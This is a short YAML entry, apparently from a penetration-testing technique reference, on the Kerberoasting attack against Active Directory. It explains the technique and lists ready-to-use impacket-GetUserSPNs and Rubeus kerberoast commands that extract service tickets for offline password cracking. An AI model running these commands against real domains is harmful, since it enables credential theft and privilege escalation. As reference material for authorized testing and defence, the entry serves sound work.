title: Kerberoasting Attack
category: 
  - AD:
    - Kerberos
    
tactic: Privilege Escalation
tags: []

description: |
  Any domain user can ask for a Service Ticket with a registered SPN. The KDC provides a 
  Service Ticket with a part encrypted with the key derived from a service`s password.

  An attacker can attempt to crack the encrypted part of a Kerberos ticket offline by guessing 
  the password associated with the service principal name (SPN). It`s not that dangerous in case 
  of computer accounts since their passwords are usually totally random and very long. However, 
  in some cases, SPNs may be configured for user or service accounts where passwords were set manually. 
  In these cases, the passwords may be weaker and more susceptible to offline cracking attacks.

references:
steps: 
  - description: Extract tickets
    options: 
      - tool: impacket
        usage: impacket-GetUserSPNs -request -dc-ip <dc-ip> 'domain.com/user:P@ssw0rd' > kerberoast.txt
        comments: 

      - tool: rubeus
        usage: |
          Rubeus.exe kerberoast /outfile:kerberoast.txt
          #or Rubeus.exe kerberoast /simple /nowrap
          #or Rubeus.exe kerberoast /user:mssql_svc /nowrap
        comments: 

comments: By default tools request RC4 encrypted tickets that can be (and probably will be) detected by SOC


  